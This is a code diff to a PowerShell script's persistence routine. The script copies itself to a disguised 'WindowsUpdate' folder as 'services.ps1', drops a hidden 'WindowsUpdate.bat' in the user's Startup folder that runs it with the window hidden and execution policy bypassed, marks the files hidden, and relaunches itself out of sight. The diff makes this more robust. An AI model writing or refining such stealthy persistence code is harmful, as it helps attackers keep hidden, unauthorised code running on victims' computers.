@@ -10,19 +10,32 @@ if ((Get-ExecutionPolicy -Scope Process) -ne 'Bypass') {
 
 # First section - persistence setup
 try {
-    # Use user's AppData folder instead of ProgramData
-    $persistPath = "$env:LOCALAPPDATA\Microsoft\Windows\WindowsUpdate"
-    $scriptPath = "$persistPath\services.ps1"
+    # Use user's AppData folder and construct full paths
+    $persistPath = Join-Path $env:LOCALAPPDATA "Microsoft"
+    $persistPath = Join-Path $persistPath "Windows"
+    $persistPath = Join-Path $persistPath "WindowsUpdate"
+    
+    $scriptPath = Join-Path $persistPath "services.ps1"
     $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
-    $batPath = "$startupPath\WindowsUpdate.bat"
+    $batPath = Join-Path $startupPath "WindowsUpdate.bat"
 
-    # Create directory if it doesn't exist (this should work without admin rights)
+    # Create directory structure recursively
     if (-not (Test-Path $persistPath)) {
         New-Item -ItemType Directory -Path $persistPath -Force -ErrorAction Stop | Out-Null
     }
 
-    # Copy script with error handling
-    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force -ErrorAction Stop
+    # Ensure script path directory exists
+    $scriptDir = Split-Path $scriptPath -Parent
+    if (-not (Test-Path $scriptDir)) {
+        New-Item -ItemType Directory -Path $scriptDir -Force -ErrorAction Stop | Out-Null
+    }
+
+    # Copy script with full path validation
+    if (Test-Path $MyInvocation.MyCommand.Path) {
+        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force -ErrorAction Stop
+    } else {
+        throw "Source script path not found"
+    }
 
     # Create batch file with error handling
     $batContent = @"
@@ -30,25 +43,22 @@ try {
 PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$scriptPath" 
 exit
 "@
+    $batDir = Split-Path $batPath -Parent
+    if (-not (Test-Path $batDir)) {
+        New-Item -ItemType Directory -Path $batDir -Force -ErrorAction Stop | Out-Null
+    }
     [System.IO.File]::WriteAllText($batPath, $batContent)
 
-    # Hide files
-    if (Test-Path $scriptPath) {
-        (Get-Item $scriptPath -Force).Attributes = 'Hidden'
-    }
-    if (Test-Path $batPath) {
-        (Get-Item $batPath -Force).Attributes = 'Hidden'
-    }
-    if (Test-Path $persistPath) {
-        (Get-Item $persistPath -Force).Attributes = 'Hidden'
-    }
+    # Hide files with validation
+    if (Test-Path $scriptPath) { (Get-Item $scriptPath -Force).Attributes = 'Hidden' }
+    if (Test-Path $batPath) { (Get-Item $batPath -Force).Attributes = 'Hidden' }
+    if (Test-Path $persistPath) { (Get-Item $persistPath -Force).Attributes = 'Hidden' }
 
     # Start hidden if not already running from persist location
     if (-not $MyInvocation.MyCommand.Path.Contains("services.ps1")) {
         Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
         exit
     }
-
 } catch {
     Write-Warning "Persistence setup failed: $_"
 }
